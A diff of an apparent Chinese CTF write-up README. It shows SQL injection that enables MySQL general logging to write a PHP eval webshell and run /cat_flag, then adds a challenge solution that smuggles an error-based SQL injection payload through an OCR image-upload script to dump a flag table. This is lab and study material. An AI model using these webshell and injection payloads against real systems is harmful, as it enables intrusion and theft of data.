@@ -233,7 +233,7 @@ Connection: close
 > 基于日志写入shell，由于 /flag的权限为400 无法直接读取，而 `/cat_flag` 可以直接运行获取 /flag的内容 故以下命令
 ```text
 /index.php?id=1;set%20global%20general_log%20=%20on;set%20global%20general_log_file%20=%20%27/var/www/html/info.php%27;show%20variables%20like%20%27%general%%27;
-/index.php?id=1 and select '<?php eval($_GET[1]);?>';
+    /index.php?id=1 and select '<?php eval($_GET[1]);?>';
 /info.php?1=system('/cat_flag');
 ```
 > 或者利用慢日志查询 直接写shell
@@ -1465,3 +1465,96 @@ Connection: close
 可见，`id`命令已经被成功执行：
 
 ![2](./img/README/2.png)
+
+## 2025数字中国数安赛道-01EasyWeb
+
+```python
+"""文字转图片模块。
+
+提供基础的文字转图片功能和自定义样式支持。
+"""
+import io
+import json
+from pathlib import Path
+from typing import Optional, Tuple
+from PIL import Image, ImageDraw, ImageFont
+import os
+import requests
+
+
+def upload_image(payload, upload_url: str) -> bool:
+    """上传图片到指定服务器。
+
+    Args:
+        image_path: 图片文件路径
+        upload_url: 上传服务器URL
+
+    Returns:
+        bool: 是否上传成功
+    """
+    try:
+
+        files = {
+            'file': ('test.png', create_image_with_text(payload), 'image/png')
+        }
+        response = requests.post(upload_url, files=files)
+        return json.loads(response.text)
+    except Exception as e:
+        print(f"图片上传出错：{e}")
+        return False
+
+
+def create_image_with_text(text="A"):
+    # 创建一个白色背景的图片，根据文字长度调整宽度
+    width = max(400, len(text) * 40)  # 增加宽度
+    height = 120  # 增加高度
+    img = Image.new('RGB', (width, height), color='white')
+    draw = ImageDraw.Draw(img)
+
+    # 使用更清晰的字体
+    try:
+        font = ImageFont.truetype("Arial.ttf", 48)  # 使用系统字体，增大字号
+    except:
+        font = ImageFont.load_default()
+
+    # 计算文字位置使其居中
+    text_bbox = draw.textbbox((0, 0), text, font=font)
+    text_width = text_bbox[2] - text_bbox[0]
+    text_height = text_bbox[3] - text_bbox[1]
+    x = (width - text_width) // 2
+    y = (height - text_height) // 2
+
+    # 绘制黑色文字，增加抗锯齿
+    draw.text((x, y), text, fill='black', font=font, stroke_width=1)
+
+    # 将图片转换为字节流
+    img_byte_arr = io.BytesIO()
+    img.save(img_byte_arr, format='PNG', dpi=(300, 300))  # 提高DPI
+    img_byte_arr = img_byte_arr.getvalue()
+
+    # 保存测试图片
+    open('test.png', 'wb').write(img_byte_arr)
+
+    return img_byte_arr
+
+
+def main():
+    while True:
+        payload = input("请输入要上传的图片内容：")
+        # 上传图片到服务器
+        upload_url = "http://127.0.0.1:8000/ocr"
+        print(upload_image(payload, upload_url))
+
+
+
+if __name__ == "__main__":
+    main()
+
+```
+
+使用报错注入OCR
+```sh
+# 1123' and (extractvalue(' ~ ', concat(' ~ ' , (select group_concat( flag ) from ocr_db.flag ) ) ) ) ) #
+
+python3 main.py
+```
